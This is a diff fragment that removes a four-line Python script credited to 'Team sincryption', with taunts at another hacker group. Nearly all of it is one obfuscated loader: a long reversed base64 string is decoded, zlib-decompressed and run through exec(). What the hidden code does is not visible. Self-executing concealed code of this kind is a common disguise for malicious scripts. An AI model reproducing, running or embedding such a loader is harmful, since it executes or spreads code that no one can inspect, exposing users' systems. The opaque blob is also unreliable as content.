@@ -1,4 +1,768 @@
-# Team sincryption
-# Encrypted by samay 
-# DOnt be script kiddie like rootxteam
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==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